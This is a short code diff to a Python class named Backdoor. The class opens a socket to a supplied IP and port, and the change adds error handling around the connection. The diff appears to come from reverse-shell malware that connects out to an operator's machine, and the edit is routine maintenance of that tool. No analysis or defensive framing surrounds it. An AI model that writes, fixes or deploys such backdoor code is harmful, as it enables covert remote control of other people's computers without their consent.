@@ -7,7 +7,11 @@ import base64
 class Backdoor:
     def __init__(self, ip, port):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.connection.connect((ip, port))
+        try:
+            self.connection.connect((ip, port))
+        except socket.error as e:
+            print(f"Connection failed: {e}")
+            exit(1)
 
     def reliable_send(self, data):
         try:
